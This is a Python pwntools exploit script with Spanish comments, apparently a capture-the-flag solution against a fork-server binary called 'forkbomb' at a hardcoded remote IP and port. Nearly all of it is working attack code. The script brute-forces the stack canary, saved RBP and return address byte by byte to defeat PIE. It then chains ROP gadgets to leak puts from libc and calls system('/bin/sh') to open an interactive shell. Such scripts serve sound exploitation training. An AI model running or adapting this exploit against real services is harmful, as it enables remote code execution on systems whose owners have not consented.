from pwn import *

# Establecemos el contexto a amd64:
context.arch = "amd64"

def brute_force_canary(padding,io):
	# Empezamos sin bytes:
	bs = b''
	bcookie	= b''
	# La cookie tiene 8 bytes:
	for b in range(0,8):
		# Para cada byte, brute-force:
		for i in range(0,256):
			bs = bcookie + p8(i)
			# Nuevo hash md5:
			io.sendlineafter("> ","1")
			io.sendafter("texto",padding + bs)
			# Recibimos lineas:
			io.recvline()
			data = io.recvline()
			# Si el byte es bueno, lo añadimos a los bytes de la cookie:
			if not b' stack smashing detected' in data:
				bcookie	+=	p8(i)
				break
			if i == 255:
				error("Algo ha salido mal; abortando ...")
				sys.exit(-1)

		# Tenemos otro byte de la cookie:
		info("CANARY, Bytes obtenidos: %s", bcookie.hex())

	# Finalmente, retornamos la cookie:
	return bcookie

def brute_force_rbp(padding,cookie,io):
	bs = b''
	brbp = b''
	for b in range(0,8):
		# Para cada byte, brute-force:
		for i in range(0,256):
			bs = brbp + p8(i)
			# Nuevo hash md5:
			io.sendlineafter("> ","1")
			io.sendafter("texto",padding + p64(cookie) + bs)
			# Recibimos lineas:
			io.recvline()
			data = io.recvline()
			# Si el byte es bueno, lo añadimos a los bytes de RBP:
			if b'hash: ' in data:
				brbp	+=	p8(i)
				break
			if i == 255:
				error("Algo ha salido mal; abortando ...")
				sys.exit(-1)

		# Tenemos otro byte de RBP:
		info("RBP: Bytes obtenidos: %s", brbp.hex())

	# Finalmente, retornamos RBP
	return brbp

def brute_force_rip(padding,cookie,RBP,io):
	bs = b''
	# El ultimo byte ya lo conocemos:
	beip = p8(0xc2)
	for b in range(1,6):
		for i in range(0,256):
			bs = beip + p8(i)
			io.sendlineafter("> ","1")
			try:
				#a = input("GDB")
				io.sendafter("texto",padding + p64(cookie) + p64(RBP) + bs)
				# Recibimos respuesta; si es "hash: %s":
				# Tenemos el hash:
				io.recvline()
				data = io.recvline()
				# Si el byte es bueno, lo añadimos a EIP:
				if b'hash:' in data:
					beip += p8(i)
					break
			except:
				# Probablemente segfault, y vuelve al menú:
				pass

		# Tenemos otro byte para RIP:
		info("EIP: Bytes obtenidos: %s", beip.hex())

	return beip

# Abrimos el binario:
binary 	= ELF("./forkbomb")

# Según si remoto o local:
if args.REMOTE:
	io 		= remote("167.235.18.25",10001)
	#libc	= "./libc6-i386_2.31-3_amd64.so"
	libc	= "./libc-2.31.so"
else:
	libc	= "/lib/x86_64-linux-gnu/libc.so.6"
	if args.GDB:
		io = gdb.debug(binary.path)
	else:
		io = process(binary.path)

libc6	= ELF(libc)

# Este es el padding para llegar a sobreescribir la cookie:
padding	= b'A'*56

# Luego tenemos:
# Canary + RBP + EIP

# Lo primero es intentar leakear la canary:
warning("Extrayendo Canary byte a byte")
cookie = int(brute_force_canary(padding,io)[::-1].hex(),16)
info("Canary es: %s", hex(cookie).zfill(8))

# Ahora debemos hacer fuerza bruta del RBP:
warning("Extrayendo RBP byte a byte")
RBP	=	 int(brute_force_rbp(padding,cookie,io)[::-1].hex(),16)
info("RBP es: %s", hex(RBP).zfill(8))

# Ahora debemos obtener la dirección del segmento de texto para poder
# hacer ROP, puesto que es un binario PIE. Nos basta con los últimos
# 4 bytes. Elegimos una dirección fiable:
# │   ││╎╎╎   0x00001ab3      488d35b8fcff.  lea rsi, [sym.md5_string]   ; 0x1772 ; int64_t arg2
# │	   │╎╎╎   0x00001aba      4889c7         mov rdi, rax                ; int64_t arg1
# │   ││╎╎╎   0x00001abd      e8c8feffff     call sym.run
# │   ││╎╎╎   0x00001ac2      488b45f0       mov rax, qword [ptr]
#
warning("Extrayendo .text segment byte a byte")
EIP = int(brute_force_rip(padding,cookie,RBP,io)[::-1].hex(),16)
info(".text segment es: %s", hex(EIP).zfill(8))

# Este leak es main+181. Ahora podemos calcular la dirección base del
# segmento de texto:
base_address	=	EIP - 0xac2
info("Binary .text segment base address es %s", hex(base_address).zfill(8))

# Obtenemos las direcciones para nuestro primer ROP:
puts_plt    =   base_address + 0x2f10
# callq puts:
#puts        =   base_address + binary.symbols["puts"]
main		=	EIP - 181
info("puts@plt at %s", hex(puts_plt).zfill(8))
#info("puts at %s", hex(puts).zfill(8))
info("main at %s", hex(main).zfill(8))

# pop_rdi_ret.
pop_rdi	=	base_address + 0xc53
info("pop_rdi_Ret at %s", hex(pop_rdi).zfill(8))

# Montamos el ROP:
leak_libc	=	p64(pop_rdi)
leak_libc	+=	p64(puts_plt)
leak_libc	+=	p64(base_address + 0x932)
#leak_libc	+=	p64(puts)
leak_libc	+=	p64(main)

# Primer ROP: leak de puts en la libc6:
rop1	=	padding + p64(cookie) + p64(RBP) + leak_libc

# Lanzamos el ataque ROP:
io.sendlineafter("> ","1")
io.sendafter("texto",rop1)
# Recibimos el leak de puts:
io.recvline()
leak = int(io.recv(6)[::-1].hex(),16)
info("libc6 put leak es %s", hex(leak).zfill(8))

# Ahora calculamos la dirección base de la libc6:
libc6_base	=	leak - libc6.symbols["puts"]
info("libc6 base address es %s", hex(libc6_base).zfill(8))

# Calculamos system y /bin/sh:
system =	libc6_base + libc6.symbols["system"]
bin_sh =	libc6_base + next(libc6.search(b'/bin/sh'))
exit   =	libc6_base + libc6.symbols["exit"]
info("system at %s", hex(system).zfill(8))
info("exit at %s", hex(exit).zfill(8))
info("bin_sh at %s", hex(bin_sh))

# Montamos el ROP final para obtener shell:
shell	=	p64(pop_rdi)
shell	+=	p64(bin_sh)
# Alinear el puto stack:
#shell	+=	p64(base_address + 0x01a)
shell	+=	p64(base_address + 0x01a)
shell	+=	p64(system)
shell	+=	p64(pop_rdi)
shell	+=	p64(0x0)
shell	+=	p64(exit)

# El segundo ROP ejecutará system:
rop2    =   padding + p64(cookie) + p64(RBP) + shell

# Mandamos el exploit:
a = input("GDB")
io.sendline("X")
io.sendlineafter("> ","1")
#io.recvline()
io.sendafter("texto",rop2)
io.interactive()

# Cerramos conexión y salimos:
io.close()
sys.exit(0)

